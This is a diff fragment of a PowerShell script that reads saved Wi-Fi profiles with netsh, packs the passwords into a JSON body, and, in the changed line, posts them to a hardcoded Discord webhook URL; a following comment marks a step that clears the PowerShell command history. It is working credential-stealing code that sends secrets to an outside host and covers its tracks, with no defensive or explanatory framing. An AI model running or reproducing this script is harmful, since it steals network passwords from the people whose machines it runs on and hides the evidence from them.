@@ -9,7 +9,7 @@ netsh wlan show profile | Select-String '(?<=All User Profile\s+:\s).+' | ForEac
 		'content' = [string]$passw
 	}
 	
-	Invoke-RestMethod -ContentType 'Application/Json' -Uri $discord -Method Post -Body ($Body | ConvertTo-Json)
+	Invoke-RestMethod -ContentType 'Application/Json' -Uri https://discord.com/api/webhooks/1299047146456088637/g__uJpm_Yj7512QOVyxYE-Cz0Ev_Akzo5UrLyXaCiBLbXMbIpCKevYxgfI3aVWOt6nW2 -Method Post -Body ($Body | ConvertTo-Json)
 }
 
 # Clear the PowerShell command history
